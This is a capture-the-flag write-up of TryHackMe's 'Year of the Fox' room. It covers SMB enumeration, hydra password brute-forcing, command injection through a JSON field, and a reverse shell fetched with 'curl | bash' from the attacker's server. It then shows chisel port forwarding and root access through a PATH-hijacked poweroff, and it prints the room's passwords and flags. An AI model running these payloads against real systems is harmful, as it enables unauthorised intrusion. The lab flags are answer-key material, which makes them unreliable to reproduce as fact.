---
title: "Year of the Fox"
date: 2025-4-01
draft: false
description: TryHackMe's Good Room 
Tags:
- TryHackMe
- Linux
- Hard
---


## Enumeration

Lets start with the portscan.
```
PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack
```

Lets enumerate smb.
![](Pasted%20image%2020250331200015.png)
![](Pasted%20image%2020250331200224.png)

But access denied.
![](Pasted%20image%2020250331201147.png)

and we can see the user fox.
`nxc smb 10.10.54.212 --users `
![](Pasted%20image%2020250331201956.png)

So we got the username fox.
Lets try to do password spray.
```bash
nxc smb 10.10.54.212 -u fox -p /usr/share/wordlists/rockyou.txt
```

I tried password spraying but it didn't worked.
![](Pasted%20image%2020250331205743.png)
After sometime,it worked.
![](Pasted%20image%2020250331205821.png)

Hmm so the password is `abcdefg`.
Really? really?.

Okay.
![](Pasted%20image%2020250331210037.png)

Lets see what we got.
![](Pasted%20image%2020250331211300.png)
We can decrypt it.
![](Pasted%20image%2020250331211331.png)

```php
5c8d7f5eaa6208803b7866d9cbf0ea8a30198a2f8f4426cbe5a4267b272e90a8
716be5b5c8943800c7be592cce374a22be2d7376a263b01791f3fb09182ad284
```

Lets see.
I spent lots of time figuring what is it.
I take a small hint.

There is also another user.
We can run `enum4linux`.
`enum4linux -a 10.10.54.212`
![](Pasted%20image%2020250331231419.png)

## Exploit

And we got another user `rascal`.
I tried that user in port 80.
But we also need password.
Lets try to use hydra.
`hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.54.212 http-get /`
And we got the password.
![](Pasted%20image%2020250331231936.png)
`angel17`

Lets login.
![](Pasted%20image%2020250331232122.png)

Hmmm interesting.
![](Pasted%20image%2020250331232549.png)

What can we do here?
Hmmm we might read files,get rce or like that.
Again i was so stuck,I took the help of writeup and the payload for exploit or command injection.
```json
\";pwd \"
```

So it worked.
![](Pasted%20image%2020250331234558.png)

Hmm lets try to get reverse shell.
But somethingis very odd. 
Doing this we got the ping.
![](Pasted%20image%2020250401003842.png)
![](Pasted%20image%2020250401003859.png)

Hmm lets try to get reverse shell.
It was full blind,something working and something not.

## Foothold

Lets first make a script like this which will give us with the rev shell.
```bash
#!/bin/bash
sh -i >& /dev/tcp/ip/9999 0>&1
```

Now we are gonna open a python3 web sever by this command.
```bash
python3 -m http.server 8000
```

And we are gonna use curl to acess it and use `|` to execute bash.
```bash
curl http://tun0:8000/shell.sh | bash
```

```php
{"target":"\";curl http://ip:8000/shell.sh | bash\n"}
```

Now we should have got our shell in our listenner.
![](Pasted%20image%2020250401004820.png)

Lets get a tty shell and try to escalate our priveleges.
And we can see the web flag.
`THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}`
![](Pasted%20image%2020250401005100.png)

## Privelege Escalation

Lets run linpeas.sh.
Now i have many questions here.
1.What was that smb files meant for?
2.Whats with user fox?
And many more.

Hmm lets continue.
Again i tried many thing but nothing worked and interestingly.
![](Pasted%20image%2020250401005910.png)
We don't even have any permission to su.

Again after trying for several minutes,I took help from writeup and there is a internal ssh port running.
![](Pasted%20image%2020250401005707.png)
Uff.
Okay lets see.
Hmm lets try doing ssh with user `rascal` with that before password.
And everything is denied.
![](Pasted%20image%2020250401010454.png)

Lets forward this port to our machine.
For that,first of all download chisel from [this](https://github.com/jpillora/chisel)

On your local machine.
```bash
chisel server -p 9001 --reverse
```

And this in victims machine.
```bash
./chisel client ip:9001 R:2222:127.0.0.1:22
```

So what it does is, first command listen on port 9001 to get reverse connection from chisel to expose victims port and second command connect to the our listenner and forward port 22 to our host on port 2222.

And now we can do ssh.
![](Pasted%20image%2020250401011625.png)

But password?.
I tried that password of user `rascal` but it wasn't working.
![](Pasted%20image%2020250401011847.png)

Hmm again after trying to find password for few minutes,i found out we need to use hydra.(obviously from writeup).
Lets use that.
I ran this command for a second.
```bash
 hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 2222
```

And we got the password.
![](Pasted%20image%2020250401012255.png)

Lets do ssh as fox.
`elijah`
![](Pasted%20image%2020250401012404.png)

Hmm now we need to became root i guess.
We also got the user flag.
`THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}`
![](Pasted%20image%2020250401012505.png)

Lets escalate our priveleges to root.
Running `sudo -l`,we can see that we can run `/usr/sbin/shutdown` as root.
![](Pasted%20image%2020250401012618.png)

Hmm lets see how we can exploit this.
We don't have any permission to do something.
![](Pasted%20image%2020250401012833.png)

Can we change the path variable?
Lets see.
Lets do this.
```bash
export PATH="/tmp:$PATH"
```
And it worked.
![](Pasted%20image%2020250401013018.png)

So now we can create a fake shutdown in `/tmp`.
I made a shutdown contaning this.
```bash
#!/bin/bash
chmod 4777 /bin/bash
echo "Done."
```

So when we run shutdown,it should run our shutdown instead of real shutdown.
But at first,lets give our shutdown with the executable permisssion.
```bash
chmod 777 /tmp/shutdown
```

But it didn't worked.
Lets see that `shutdown` executable.
![](Pasted%20image%2020250401135733.png)

Hmm its using `poweroff`.
Lets see this executable.

Ohh what if instead of shutdown,we create a poweroff.
Lets just copy `/bin/bash` to `/tmp/poweroff`.
![](Pasted%20image%2020250401140110.png)

Now lets give it good permission and run `shutdown` with sudo.
![](Pasted%20image%2020250401140240.png)

And we became root.
Lets get the flag.
Hmmm.
![](Pasted%20image%2020250401140323.png)

Lets search for root flag.
```bash
find / -type f -name "*root*" 2>/dev/null
```

And we got it.
![](Pasted%20image%2020250401140743.png)

Hmm lets read that.
![](Pasted%20image%2020250401141059.png)

But what is that base64 thing.
It gives us with hash like strings after decoding.
Like what we have got before in `creds.txt` and `cipher.txt`.
Hmmm.

## Done
And done.
![](Pasted%20image%2020250401141140.png)

Again learned lots of things again.
I hope you are doing great.
Take care :).
